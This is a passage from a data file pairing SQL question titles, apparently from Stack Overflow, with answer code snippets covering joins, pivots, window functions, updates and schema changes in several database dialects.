GROUP BY Number
HAVING COUNT(Result) > 25
"
30696,54360,How to convert full outer join query to O-R query?,"SELECT NVL(f.product_id, h.product_id), NVL(f.period, h.period), 
       f.forecast_sale, h.actual_sale
FROM forecast f 
FULL OUTER JOIN history h ON h.product_id = f.product_id and h.period = f.period
"
22279,72397,comparision of two columns within a single table,"SELECT `B`, COUNT(*) AS `Count`
FROM `Alpha` 
GROUP BY `B`
"
34566,14935,SQL problem with 12 subquery,"SELECT
    D.name,
    AVG(CASE WHEN MONTH(V.visit_date) = 1 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 2 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 3 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 4 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 5 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 6 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 7 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 8 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 9 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 10 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 11 THEN V.cost ELSE NULL END),
    AVG(CASE WHEN MONTH(V.visit_date) = 12 THEN V.cost ELSE NULL END)
FROM
    Doctors D
INNER JOIN Visits V ON
    V.id_doc = D.id AND
    V.visit_date BETWEEN '2009-01-01' AND '2009-12-31'
GROUP BY
    D.name
ORDER BY
    D.name
"
34565,18518,Change the encoding of a MySQL database,"ALTER DATABASE `test` CHARACTER SET utf8 COLLATE utf8_general_ci;
"
18089,6992,Combining two Count Queries into one,"SELECT course, 
       sum(pickout='Yes') AS countp,
       sum(pickout='Yes' AND result='Won') AS countw
FROM table1 
GROUP BY course
"
8791,10185,How can I add a WHERE clause for each row in a subquery?,"select t1.id, t1.content, ts_a.tag, ts_b.tag, ts_c.tag, ts_d.tag, ts_e.tag
from content t1
LEFT JOIN tags ts_a ON t1.tag_a_id=ts_a.id
LEFT JOIN tags ts_b ON t1.tag_b_id=ts_b.id
LEFT JOIN tags ts_c ON t1.tag_c_id=ts_c.id
LEFT JOIN tags ts_d ON t1.tag_d_id=ts_d.id
LEFT JOIN tags ts_e ON t1.tag_e_id=ts_e.id
where ""News"" in (ts_a.tag, ts_b.tag, ts_c.tag, ts_d.tag, ts_e.tag)
and ""MedicalCare"" in (ts_a.tag, ts_b.tag, ts_c.tag, ts_d.tag, ts_e.tag)
"
19378,1614,SELECT against stored procedure SQL Server,"declare @t table (
    -- columns that are returned here
);

insert into @t(<column list here>)
    exec('storedp_Value');
"
8859,2134,DB2- How to check if varchar field value has integers,"CASE
  WHEN LENGTH(RTRIM(TRANSLATE(test_str, '*', ' 0123456789'))) = 0 
  THEN 'All digits'
  ELSE 'No'
END
"
1075,57779,Search and Replace a a partial string / substring in mssql tables,"update MyTable 
    set MyColmun = cast(replace(cast(MyColumn as nvarchar(max)), N'/oldserver.com/foo/', N'/newserver.org/bar/') as ntext)
    where cast(MyColumn as nvarchar(max)) LIKE N'%/oldserver.com/foo/%'
"
28689,60921,How to Create Identity field based on the row,"ALTER TABLE dbo.YourTable
ADD NewColumn INT IDENTITY(1,1) 
"
26665,63782,Is it possible to get several COUNT in one single SQL request?,"SELECT 
    [T].[JobOfferId],
    [T].[JobOfferTitle],
    SUM(CASE WHEN [S].[ApplicationStatusTechnicalName] = 'CANDIDATE' THEN 1 ELSE 0 END) AS [CandidateCount],
    SUM(CASE WHEN [S].[ApplicationStatusTechnicalName] = 'ACCEPTED' THEN 1 ELSE 0 END) AS [ACCEPTEDCount],
    SUM(CASE WHEN [S].[ApplicationStatusTechnicalName] = 'REFUSED' THEN 1 ELSE 0 END) AS [REFUSEDCount]
FROM    [tJobOffer] AS [T]
        LEFT JOIN   [tApplication] AS [A]
            ON      [A].[JobOfferId] = [T].[JobOfferId]
        LEFT JOIN   [tApplicationStatus] AS [S]
            ON      [S].[ApplicationStatusId] = [A].[ApplicationStatusId]
GROUP BY
        [T].[JobOfferId],
        [T].[JobOfferTitle]
ORDER BY [T].[JobOfferTitle] ;
"
33901,21695,XPath query runs slow when referencing parent node using ../../<node name>,"SELECT
    s.value('(SessionID)[1]', 'int') SessionID,             
    r.value('(Heading)[1]', 'float') Heading,
    r.value('(Speed)[1]', 'float') Speed,
    r.value('(Height)[1]', 'float') Height,
    r.value('(FlowRate)[1]', 'float') FlowRate,
    r.value('(AppRate)[1]', 'float') AppRate,
    r.value('(Point/Lat)[1]', 'float') Latitude,
    r.value('(Point/Lng)[1]', 'float') Longtitude
INTO #Reading
FROM
    @XMLData.nodes('/Sessions') as S(s)
    CROSS APPLY 
    s.nodes('./Readings/Reading') XMLData(r)
"
33416,22761,mysql query returning the same row multiple times,"SELECT off.*
    , resp.tracking_date
    , resp.paid_date
    , resp.total_value
    , resp.total_conversion
FROM tbl_offers AS off
    INNER JOIN tbl_tracking AS tr ON tr.offer_id = off.id
    INNER JOIN tbl_trackvalue AS resp ON resp.tracking_id = tr.id
WHERE off.offer_type = 'cash_offer'
AND tr.user_id = '1454'
AND resp.total_value !=0
AND resp.payment_status = 'paid'
LIMIT 0 , 30
"
9031,32424,Overriding sql table structure,"alter table table_1 modify name varchar(256) not null;

alter table table_1 add number integer unsigned not null;
"
25282,75050,SQL SUM hours between two dates & GROUP BY Column Name?,"SELECT TOP 10
    t1.Action, t1.[Time],
    COALESCE(t2.[Time],0) AS [Previous Period 'Time'],
    COALESCE( ( ((t1.[Time]*1.0) - (t2.[Time]*1.0)) / (t2.[Time]*1.0) ), -1 ) AS [Change]
FROM 
    (
        SELECT 
            Action, 
            SUM(DATEDIFF(SECOND, StartTime, EndTime)) AS [Time],
        FROM Actions
        WHERE StartTime BETWEEN @start AND @end
        GROUP BY Action
    ) t1
LEFT JOIN
    (
        SELECT 
            Action, 
            SUM(DATEDIFF(SECOND, StartTime, EndTime)) AS [Time]
        FROM Actions
        WHERE StartTime BETWEEN @prev AND @start
        GROUP BY Action
    ) t2
ON
    t1.Action = t2.Action
ORDER BY t1.[Time] DESC
"
26495,54923,How to select a distinct when multiple columns are needed,"select c1.*
from dbo.Contacts c1
where not exists (
    select 1 from dbo.Contacts c2
    where c1.Email = c2.Email
    and c2.ID < c1.ID
)
"
30761,402,Filter by row in a column,"SELECT COUNT(*)
FROM
(
   SELECT ItemID
   FROM tableName
   WHERE value IN ('A', 'C') -- the values you are looking
   GROUP BY ItemID
   HAVING COUNT(*) = 2       -- the number of values
) a
"
34196,54405,How to get recent data and previous data in SQL,"select applicationId,
       sum(case when someId = 8 then Amount else 0 end) as LastMonth,
       sum(case when someId = 10 then Amount else 0 end) as ThisMonth,
       sum(case when someId = 8 then -Amount 
                when someId = 10 then Amount
                else 0
           end) as Diff
from t
group by applicationId;
"
8046,53953,SQL Query how to count different value in single row,"SELECT A, B,
       sum(if(C=3, D, NULL)) as C3,
       sum(if(C=4, D, NULL)) as C4,
       sum(if(C=5, D, NULL)) as C5
  FROM yourTable
GROUP BY A, B;
"
13415,62013,How to make limit offset dynamic using only (My)SQL,"DECLARE offset bigint
SELECT pagenr * 10 INTO offset FROM pages where id = 3;
SELECT * FROM table1 LIMIT offset, 10;
"
21268,4280,"Using ""IN"" in a WHERE clause where the number of items in the set is very large","WHERE id IN (1,2,3,4,.....10000)
"
33175,33947,How to restrict insertion of value that already exists in other table,"Create Proc Testing
as
Set NoCount ON
Set XACT_ABORT ON

Begin Try
   Begin Tran
    IF Not Exists(SELECT 1 FROM Table2 i JOIN Table1 t ON i.key = t.key)
    Begin
         //Your insert statement
    END
   Commit Tran
End Try

Begin Catch
    Rollback Tran
End Catch
"
3204,56474,dynamic update table from csv on multiple columns,"MERGE PermanentT AS [TARGET]
USING #TempT AS [SOURCE]
ON [TARGET].PrimId = [SOURCE].PrimId
    AND [TARGET].MyDates = [SOURCE].MyDates
WHEN MATCHED AND [TARGET].PRICE <> [SOURCE].PRICE
THEN UPDATE SET [TARGET].PRICE = [SOURCE].PRICE
WHEN NOT MATCHED
THEN INSERT (PrimID, myDate, myPrice) 
VALUES (SOURCE.PrimID, SOURCE.myDate, SOURCE.myPrice);
"
33055,67473,Interview question: SQL recursion in one statement,"    SELECT id,
           parent,
           CONNECT_BY_ROOT id
      FROM table
START WITH parent IS NULL
CONNECT BY PRIOR id = parent
"
895,2243,Help with MYSQL query,"SELECT DATE(timestamp) AS type, COUNT(*) AS `count`
FROM sometable
GROUP BY DATE(timestamp)
ORDER BY DATE(timestamp)
"
3714,72942,How can I retrieve the last non-zero value in a column,"with table1 as (select 103.46 col1, to_date('01/10/2015', 'dd/mm/yyyy') col2, 0 col3 from dual union all
                select 381.67 col1, to_date('02/10/2015', 'dd/mm/yyyy') col2, 150.60 col3 from dual union all
                select 741.31 col1, to_date('03/10/2015', 'dd/mm/yyyy') col2, 0 col3 from dual union all
                select 14.21 col1, to_date('03/10/2015', 'dd/mm/yyyy') col2, 0 col3 from dual union all
                select 35.37 col1, to_date('05/10/2015', 'dd/mm/yyyy') col2, 0 col3 from dual union all
                select 11.24 col1, to_date('12/10/2015', 'dd/mm/yyyy') col2, 19.23 col3 from dual union all
                select 13.77 col1, to_date('13/10/2015', 'dd/mm/yyyy') col2, 0 col3 from dual)
select col1,
       col2,
       nvl(last_value(decode(col3, 0, cast(null as number), col3)) ignore nulls over (order by col2, col3 desc), 0) col3
from   table1;

      COL1 COL2             COL3
---------- ---------- ----------
    103.46 01/10/2015          0
    381.67 02/10/2015      150.6
    741.31 03/10/2015      150.6
     14.21 03/10/2015      150.6
     35.37 05/10/2015      150.6
     11.24 12/10/2015      19.23
     13.77 13/10/2015      19.23
"
4371,58352,MySQL LEFT OUTER JOIN to speed up query,"SELECT url_source_wp.url 
FROM url_source_wp 
LEFT OUTER JOIN url_done_wp
    ON url_source_wp.id = url_done_wp.url_source_wp AND url_done_wp.url_group = 4 AND hash IS NULL
WHERE url_done_wp.url_source_wp IS NULL
LIMIT 50
"
10263,29377,How to get complex values as columns,"DECLARE @CONTACTS TABLE (ID INT IDENTITY(1,1), FNAME VARCHAR(100), LNAME VARCHAR(100))
DECLARE @CONTACTS_PHONE TABLE (ID INT IDENTITY(1,1), CONTACTID INT, TYPEID INT, PHONE VARCHAR(10))
DECLARE @PHONETYPE TABLE (ID INT IDENTITY(1,1), PHONETYPE VARCHAR(100))

INSERT INTO @CONTACTS (FNAME,LNAME) 
SELECT 'JIGGS', 'JEDI'

INSERT INTO @PHONETYPE (PHONETYPE)
SELECT 'MOBILE' UNION
SELECT 'HOME' UNION
SELECT 'OFFICE'

INSERT INTO @CONTACTS_PHONE (CONTACTID, TYPEID, PHONE)
SELECT 1, 1, '5555555' UNION
SELECT 1, 1, '6666666' UNION
SELECT 1, 2, '0000000' UNION
SELECT 1, 2, '1111111' UNION
SELECT 1, 3, '4444444'

;WITH PIVOTSTUFF
AS
(
SELECT *
FROM (SELECT DISTINCT T.CONTACTID, PT.PHONETYPE, 
               PHONES = REPLACE(STUFF( 
                (   SELECT ',' + PHONE AS [data()] 
                    FROM @CONTACTS_PHONE AS X
                    WHERE X.CONTACTID = T.CONTACTID 
                    AND X.TYPEID = T.TYPEID
                    ORDER BY PHONE 
                    FOR XML PATH ('') ), 1, 1, ''), ' ,', ',')
        FROM @CONTACTS_PHONE AS T
        JOIN @PHONETYPE PT
           ON T.TYPEID=PT.ID) DATATABLE
PIVOT(MIN([PHONES])
      FOR PHONETYPE IN ([HOME],[MOBILE],[OFFICE])) PIVOTTABLE
)

SELECT C.ID, C.FNAME, C.LNAME, T.HOME, T.MOBILE, T.OFFICE
FROM PIVOTSTUFF T
JOIN @CONTACTS C
   ON T.CONTACTID=C.ID
"
18726,71417,Delete from a table where aa<>aa from another database,"DELETE FROM table
WHERE NOT EXISTS (
    SELECT *
    FROM table@database2 tt
    WHERE tt.field1=table.field1 AND tt.field2=table.field2
)
"
19857,10844,SQL Query Yield Distinct by one column,"SELECT MIN(dataid) dataid, TED_ID
FROM
(
    SELECT
        llattrdata.ID dataid,
        MAX(CASE WHEN llattrdata.ATTRID = 2 THEN llattrdata.VALSTR END) TED_ID
    FROM llattrdata
    JOIN dtree ON llattrdata.ID = dtree.DATAID
    WHERE llattrdata.DEFID = 19400074
    AND llattrdata.VERNUM = dtree.VERSIONNUM
    GROUP BY llattrdata.ID
) T1
GROUP BY TED_ID
"
36422,43451,Count comparison where some characters are numeric,"SELECT
    SUM( IsFirstSubCompany ) FirstSubCompanyEmployeeCount
    , SUM( IsMainCompany ) MainCompanyEmployeeCount
FROM
    (
        SELECT
            IsFirstSubCompany = CASE 
                WHEN u.Num LIKE '%[a-z]%' OR ( 1 = ISNUMERIC( u.Num ) AND CONVERT( INT, u.Num ) BETWEEN 55556 AND 88888 ) THEN 1 ELSE 0
            END,
            IsMainCompany = CASE
                WHEN 1 = ISNUMERIC( u.Num ) AND CONVERT( int, u.Num ) BETWEEN 00000 and 55555 THEN 1 ELSE 0
            END
        FROM
            UserTable u    
    ) q
"
35418,38696,How could I find a row with maximun value of a column in SQL?,"select * from
(
select *,rn=row_number()over(partition by City order by totalpoints desc) from table
)x
where rn=1
"
30916,33244,Getting the definition of the tables and columns via a sql statement,"SELECT obj.name, cols.name as columnname
from dbname.sys.objects as obj
inner join dbname.sys.columns as cols
on obj.object_id = cols.object_id
where obj.type='U'
"
9693,32285,Making unique slug url in Oracle,"select regexp_substr('lorem-ipsum-dolor-2','\d+$') from dual;
"
29804,71534,mysql how to get rows with max date when grouping?,"SELECT  a.*
FROM    tableName a
        INNER JOIN 
        (
            SELECT  product, MAX(date) mxdate
            FROM    tableName
            GROUP   BY product
        ) b ON a.product = b.product
                AND a.date = b.mxdate
"
13897,51564,A Proper One-to-One Mapping Table,"CREATE TABLE [dbo].[test](
    [x] [int] NOT NULL,
    [y] [int] NOT NULL,
     CONSTRAINT [PK_test] PRIMARY KEY CLUSTERED 
     ( [x] ASC) 
     WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, 
         IGNORE_DUP_KEY = OFF, ALLOW_ROW_LOCKS  = ON, 
         ALLOW_PAGE_LOCKS  = ON) 
     ON [PRIMARY]) 
 ON [PRIMARY]

CREATE UNIQUE NONCLUSTERED INDEX [IX_test] ON [dbo].[test] 
  ([y] ASC) 
   WITH (PAD_INDEX  = OFF, STATISTICS_NORECOMPUTE  = OFF, 
         SORT_IN_TEMPDB = OFF, IGNORE_DUP_KEY = OFF, 
         DROP_EXISTING = OFF, ONLINE = OFF, ALLOW_ROW_LOCKS  = ON, 
         ALLOW_PAGE_LOCKS  = ON)  
 ON [PRIMARY]
"
25888,29449,Can a many-to-many join table have more than two columns?,"Team_Id
Position_Code
Member_Id
Start_Date
End_Date NULLABLE
"
4823,25451,ORA-01000: maximum open cursors exceeded,"var
 AQuery: TQuery;
begin
  AQuery:= TQuery.Create(nil);
  try
    AQuery.DatabaseName:= ADatabase.DatabaseName;

    with AQuery do
    begin
      SQL.Text:= 'UPDATE AP_Master'#13 +
                 'SET CMCL_FORECAST_CLEARED = :AClearedDate'#13 +
                 'WHERE ID= :AMasterId';
      ParamByName('AMasterId').AsInteger := AId;
      // Note the date->string->date is not necessary; setting the param
      // AsDateTime with a TDateTime value will format it correctly for you.
      ParamByName('AClearedDate').AsDateTime:= AForeCastClearedDate;

      try // Protect open
        try
          ExecSql;
          except 
           on E: Exception do
             raise Exception.create('Error Updating AP_Master Tables' +
                                    ' Forecast Date Cleared' +
                                    E.Message);   
          end;//except
        end; // except try
      finally
        AQuery.Close;  // finally means it's closed every time always
      end; //finally try for opening
    end; //with
  finally
    AQuery.Free;  // finally here ensures free
  end;
end;
"
3257,15640,Limit result amount for each ID to x,"SELECT *
FROM (
      SELECT profile_number, score, map_id
      FROM ( 
        SELECT 
          profile_number, score, map_id, 
          IF( @prev <> map_id, @rownum := 1, @rownum := @rownum+1 ) AS rank, 
          @prev := map_id
        FROM scores 
        JOIN (SELECT @rownum := NULL, @prev := 0) AS r 
        ORDER BY map_id
      ) AS tmp 
      WHERE tmp.rank <= 10 
      ) s
      JOIN players p
        ON s.profile_number = p.profile_number
"
11097,75191,How do I write a create table statement for an entity that has two relationship sets attached to it?,"CREATE TABLE TEAM
 (TEAM_NAME  VARCHAR2(50)
    CONSTRAINT PK_TEAM
      PRIMARY KEY
      USING INDEX);

CREATE TABLE TEAM_MEMBER
 (TEAM_NAME  VARCHAR2(50)
    CONSTRAINT TEAM_MEMBER_FK1
      REFERENCES TEAM(TEAM_NAME),
  PERSON_ID  NUMBER,
  CONSTRAINT PK_TEAM_MEMBER
    PRIMARY KEY(TEAM, PERSON_ID)
    USING INDEX);
"
21579,75603,Selecting nested common attributes,"select  'Common Color' as Id
,       (select color from orders where item = 'item a' group by color 
           order by count(*) desc limit 1) as Value
union all
select  'Common Style'
,       (select style from orders where item = 'item a' group by style 
            order by count(*) desc limit 1)
union all
select  'Common Size'
,       (select size from orders where item = 'item a' group by size 
            order by count(*) desc limit 1)
"
29450,70054,Update column within CASE statement with results of a subquery postgres,"UPDATE datazone_report_resupply r
SET es_actual =
    (CASE WHEN EXISTS (SELECT 1
                       FROM suppliersnew s
                       WHERE St_contains(r.geom, s.geometry) AND
                             s.status IN ('Under construction', 'Unknown', 'Operational')
                      ) 
          THEN 1 ELSE 0
      END);
"
640,56144,Select previous row for each entry in Table/List,"SELECT 
    t.TimeStamp,
    (
     SELECT MAX(t1.TimeStamp)
        FROM MyTable t1
        WHERE t1.Row < t.Row
    ) AS PrevTimeStamp
FROM MyTable t
WHERE t.Row >= 3 AND t.Row <= 6
"
14749,4311,Case condition does not return desirable results,"SELECT
    AccountTitle,
    CASE
        WHEN SourceDocDR < 1 THEN  ''        
        ELSE CAST(SourceDocDR AS VARCHAR(MAX))
    END AS 'Debit',
    CASE
        WHEN SourceDocCR < 1 THEN ''
        ELSE CAST(SourceDocCR AS VARCHAR(MAX))
    END AS 'Credit'
FROM tblAccounting_GL
WHERE 
    MONTH(PostingDate) = MONTH(GETDATE())
GROUP BY 
    AccountTitle, SourceDocDR, SourceDocCR;
"
26939,58478,Classic ASP / MSSQL - Remove returned results based on certain conditions,"select t1.*
from your_table t1
join
(
  select userid, max(date) as mdate
  from your_table
  group by userid
  having sum(case when amount = 0 then 1 else 0 end) = 0
) t2 on t1.userid = t2.userid and t1.date = t2.mdate
"
22845,45457,How can I generate a username in an existing table?,"UPDATE users u
SET username = (SELECT first_name || '.' || last_name 
               FROM student s 
               WHERE u.userid = s.userid)
"
6388,60134,self join on huge table,"SELECT 
  A.dateField, B.dateField, A.curStatus, B.curStatus, A.prevStatus, B.prevStatus 
FROM 
  table1 A
CROSS APPLY
(
-- consider using
--  SELECT top 1 dateField, curStatus, prevStatus 
-- if you only want 1 row for each match
SELECT dateField, curStatus, prevStatus 
FROM table1
WHERE 
  dateField BETWEEN a.dateField and dateadd(d, 2, a.dateField) AND 
  curStatus = 0 and prevStatus = 27
-- in case you just want 1 row
-- ORDER BY datefield --(or whatever you want to order by)
) B
WHERE A.curStatus = 27 and A.prevStatus = 0
"
5549,31426,"count the instances of value in sub-query, update table","
SELECT id, mytype, COUNT(*) 
FROM table_name
GROUP BY id, mytype 
"
34093,27122,Select field of record contains max of another field,"select distinct on (name) p.surname 
from person p
order by name, age desc
"
33096,62754,SQL query to turn audit trail in / out times to list of locations,"select *
from
(select ""Widget ID"" id, 
""New Location"" loc,
""Date"" start_date, 
lead(""Date"", 1, sysdate) over (partition by ""Widget ID"" order by ""Widget ID"") end_date
from widgets) t
where t.loc = 101
and start_date < <<your_ending_date>> and end_date > <<your_starting_date>> 
"
6783,38242,"How can I write a query that excludes certain results, but includes results that lack the association used for exclusion?","SELECT p.id
FROM provisions p LEFT OUTER JOIN provisions_requirements r
 ON (p.id = r.provision_id AND r.requirement_id IN (4))
WHERE r.requirement_id IS NULL
LIMIT 0, 10;
"
11919,49024,Sql: have a column return 1 or 0 denoting if an id exists in a table for a predetermined groupID,"SELECT access_b2b.access_id,
       access_b2b.description,
       'active'= CASE
                   WHEN access_group.group_id IS NOT NULL THEN 1
                   ELSE 0
                 END
FROM   access_b2b
       LEFT JOIN access_group
              ON access_group.access_id = access_b2b.access_id
                  AND ( access_group.group_id = 10
          OR access_group.group_id IS NULL )
"
29171,6876,Passing variable to.exe in SQL,"DECLARE @ODBCConn varchar(10)
SET @ODBCConn = 'TestDb'

DECLARE @Cmd varchar(500)
SET @Cmd = '""C:\tmt.exe"" ' + @ODBCConn

EXECUTE master..xp_cmdshell @Cmd 
"
36736,67200,Conditional WHERE clause with case statement,"CASE
  WHEN Site.siteID IN ('1T','1Q') 
    THEN RTRIM(LTRIM(SUBSTRING(Customer.clientID ,1,6)))
  ELSE Customer.clientID
END = @clientID
"
14969,36747,SQL Server 2005 using case in order by,"WITH unionresult AS (
  <original query here>
), cte AS (
  SELECT *, ROW_NUMBER() OVER (ORDER BY st) rn
  FROM unionresult
)
SELECT st FROM cte 
ORDER BY 
  CASE WHEN st = 'FUT' THEN 1 ELSE 2 END,
  CASE WHEN St LIKE '%PE' THEN -rn END,
  CASE WHEN St LIKE '%CE' THEN  rn END
"
3859,17192,Find a time difference to the following row,"postgres=# SELECT No, SourceID, RecordID, StartDate, EndDate
postgres-#       ,LEAD(StartDate) OVER(PARTITION BY SourceID ORDER BY StartDate) - EndDate AS diff
postgres-#   FROM myTable;
 no | sourceid | recordid |      startdate      |       enddate       |   diff
----+----------+----------+---------------------+---------------------+-----------
  1 |        1 |        1 | 2009-09-07 09:12:00 | 2009-09-07 11:00:00 |  00:19:00
  2 |        1 |        1 | 2009-09-07 11:19:00 | 2009-09-07 12:12:00 |  00:11:00
  3 |        1 |        1 | 2009-09-07 12:23:00 | 2009-09-07 12:54:00 |  00:55:00
  4 |        1 |        1 | 2009-09-07 13:49:00 | 2009-09-07 14:45:00 |
  5 |        2 |        2 | 2009-10-12 09:12:00 | 2009-10-12 11:00:00 |  00:19:00
  6 |        2 |        2 | 2009-10-12 11:19:00 | 2009-10-12 12:12:00 |  00:11:00
  7 |        2 |        2 | 2009-10-12 12:23:00 | 2009-10-12 12:54:00 |
(7 rows)
"
16295,42947,MySQL on duplicate key... get existing ID?,"insert into t(id, tag)
    select id, tag
    on duplicate key update ModifiedDate = now();
"
35751,31724,How to count number of character after .(dot) in db2,"select len(numfmt) - locate_in_string(numfmt, '.')
"
24122,22096,How can I select from list of values in Oracle,"select distinct column_value from table(sys.odcinumberlist(1,1,2,3,3,4,4,5))
"
36802,6039,"Android dev: Creating a sqlite database for word games, no user inputs","// you would want an onCreate and onUpgrade method for best practices,, here's a partial look of what you want...

public class DBManager extends SQLiteOpenHelper
{
    static final String TAG = ""DBManager"";
    static final String DB_NAME = ""words.db"";
    static final int DB_VERSION = 1;

    static final String TABLE = ""words_table"";
    static final String C_ID = ""id"";
    static final String C_WORD = ""word"";

    public DBManager(Context context)
    {
    super(context, DB_NAME, null, DB_VERSION);
    }

    @Override
    public void onCreate(SQLiteDatabase db)
    {
    String sql = ""CREATE TABLE "" + TABLE + "" ("" 
               + C_ID + "" INTEGER PRIMARY KEY AUTOINCREMENT, "" 
               + C_WORD + "" TEXT)"";

    db.execSQL(sql);
    }

    @Override
    public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
    {
    db.execSQL(""DROP TABLE IF EXISTS "" + TABLE);
    onCreate(db);
    }

        //**** Code Insert Word and Retrieve Word Methods *****//

        //**** End Code Insert Word and Retrieve Word Methods *****//
}
"
11700,55228,REGEX_REPLACE not working as expected in oracle 10g,"Select REGEX_REPLACE('Mathew, Sajan K ext (E IT S US 1)','\([^\)]+\)','') ""REGEXP_REPLACE""
"
15436,20813,Hey what is the datatype I am looking for?," table: Articles         table: Tags         table: ArticleTags
 ----------------        --------------      -----------------
| article_id  PK |      | tag_id    PK |    | article_id   FK |
| title          |      | name         |    | tag_id       FK |
| content        |      |              |    |                 |
|                |       --------------      -----------------
 ----------------
"
37268,36794,Django: Many-to-many with through vs 2x one-to-many,"model.m2m_through_set.all() # this would work
model.m2m_through_set.create(target=target_instance)
"
12227,31338,Using a foreign key - only 2 records?,"ALTER TABLE your_table
ADD CONSTRAINT chk_balanceimpact CHECK (balanceimpact in ('C','D'))
GO
"
31183,30204,Alter every double fields of a table,"select 'ALTER TABLE ' + table_name + ' ALTER COLUMN ' + column_name + 'TYPE numeric(15,3)'  
  from information_schema.columns 
 where data_type = 'double precision' 
       and table_name = 'YOUR_TABLE_NAME'
"
38104,65140,Mysql SUM inside a CASE,"case when foo.id is null then 'N/A' else cast(sum(foo.points) as char) end as score
"
18425,47922,"How to turn off optimistic concurrency check in SqlCe, linq-to-sql (SqlMetal)?","UpdateCheck:=UpdateCheck.Never
"
1926,42585,How to prevent MySQL user-defined variables collision,"SELECT t.*, @sum := @sum + `value` AS SUM
FROM `table` t CROSS JOIN
     (SELECT @sum := 0) params;
"
16238,25482,Count different rows from one table,"SELECT id_title AS id, SUM(action='like') AS 'count like', 
SUM(action='unlike') AS 'count unlike', SUM(action='share') 
AS 'count share' FROM t1 GROUP BY id_title
"
21283,70008,Create a table + populate it using another table in One Query,"SELECT column1, column2, ...columnN 
   into first_table_name 
   FROM second_table_name
   [WHERE condition];
"
35836,67246,Extract selective records,"select
    Customer, 
    InvoiceNo, 
    Type, 
    decode(Type, 'MISC', 0, 1) * Amount as Sales_Amt, 
    decode(Type, 'MISC', 1, 0) * Amount as Misc
from
    TableA
;
"
32358,44548,changing selected values in INSERT statement,"INSERT INTO NEWTABLE (ID, VALUE, NEWVALUE)
SELECT
    ID,
    VALUE,
    CASE OLDVALUE
       WHEN 'A' THEN 'Y'
       WHEN 'B' THEN 'Z'
       ELSE OLDVALUE
    END
FROM OLDTABLE;
"
28028,51557,select results from two tables but choose one field over another," SELECT E.ID, COALESCE(P.PreferredName,E.Name,'Unknown') as Name
 FROM tblemployee E
 LEFT JOIN tblExtraOrMissingInfo P ON E.ID = P.ID AND P.UsePreferredName = 1
"
27363,2562,Getting random rows based on column index,"select name, text
from (SELECT name, text, row_number() over (partition by name order by random()) as seqnum
      FROM testing t INNER JOIN
           users u
           ON u.id = t.id
      ) t
where seqnum = 1;
"
11078,53838,SQLite3 Find Average Value for,"SELECT Name, dirId, AVG(budget)
FROM DIRECTOR, DIRECTED, MOVIE
WHERE dir.DId = dir.DirectorId   AND
dir.MovieIdentity= mov.MovieIdentity
group by MovieIdentity
"
10132,21129,Insert if table is empty OR join condition is fullfilled,"INSERT INTO bids (user_id, auction_id) 
SELECT 1, a.id
FROM auctions AS a
left outer join bids AS b
ON a.id = b.auction_id
AND (UNIX_TIMESTAMP() - b.created_at) < a.timer
where
(a.user_id IS NULL
AND a.id = 1

) OR
b.id IS NULL     --this will be true if there is no bid present
LIMIT 1
"
12014,43265,Delete MySQL table with an Iterator,"DROP TABLE IF EXISTS temptt;
CREATE TEMPORARY TABLE temptt (`id` INT, `value` INT);
INSERT INTO temptt 
    SELECT * FROM your_table GROUP BY id;
DELETE t1.* 
FROM your_table t1 LEFT JOIN temptt t2
    ON t1.id = t2.id AND t1.value = t2.value
WHERE t2.id IS NULL;
"
32911,5643,Unknown Column in field list when already in columns,"SELECT rank, damage, playerID 
FROM 
(
  SELECT @rownum := @rownum + 1 rank, damage, playerID
    FROM PlayerStats, (SELECT @rownum := 0) n
   WHERE playerID > 20130000000000 
   ORDER BY damage DESC, modified
) r 
-- WHERE playerID='20130000000004'
ORDER BY rank
"
25627,16713,SQL Server 2008R2 Join One To Many,"select *
from case C
left join P on P.case_id = C.case_id and P.primary_party != ''
where P.case_id is null
"
6779,5166,How to select a value in the same table as the value for an update for each row,"-- create dummy table
create table test (id int, name varchar(20), 
parentid int, parentname varchar(20))

go

-- add some rows 
insert test values (1, 'parent A', null, null)
insert test values (2, 'parent B', null, null)
insert test values (3, 'parent C', null, null)

insert test values (11, 'child A 1', 1, null)
insert test values (12, 'child A 2', 1, null)
insert test values (33, 'child C 1', 3, null)

go

-- perform update
update c set parentname = p.name from test c join test p on c.parentid = p.id 

go

-- check result
select * from test
"
37594,70735,SQL Select Distinct Top 2,"SELECT DISTINCT TOP 2 PartId, IdNumber, Length
FROM
(   SELECT PartId, IdNumber, Length, ROW_NUMBER() over(partition by IdNumber order by Length) Orden
    FROM [Ayuda]
) A
WHERE A.Orden = 1
ORDER BY Length
"
4055,61406,Convert date time to below format SQL Server,"SELECT FORMAT(CAST('2011-11-26 01:30:38.000' AS DATETIME), 'MM-dd-yyyy hh:mm:ss tt')
"
14948,32134,SQL Query - Displaying the same column twice under different conditions,"SELECT 
   NAME, 
   MIN(ID) as ID1,
   MAX(ID) as ID2
FROM Table t
GROUP BY NAME
"
52,7597,Sub query in MySQL to retrieve maximum of date if present NULL if absent,"select u.userid, u.username, u.email, up.mobile, uh.problems, s.max_session_date 
from users u
inner join user_personal up on u.userid = up.userid
inner join user_health uh on u.userid = uh.userid
left outer join (select userid, max(session_date) max_session_date
                 from sessions
                 group by userid
                 ) s
    on u.userid = s.userid;
"
13615,50410,Mysql query INSERT two tables,"insert table1 (name,category) values ('waterfall 2', 'nature');
insert rating (rating,total_rating,total_rates,photoID) values
    (0, 0, 0, last_insert_id());
"
8355,1105,Comparing Similar Columns for Equality,"SELECT ItemID
FROM   ItemData
GROUP BY
       ItemID
HAVING COUNT(DISTINCT Retail)>1
"
12131,46648,SQL CASE between values of the same table,"declare @NonMatched int

select
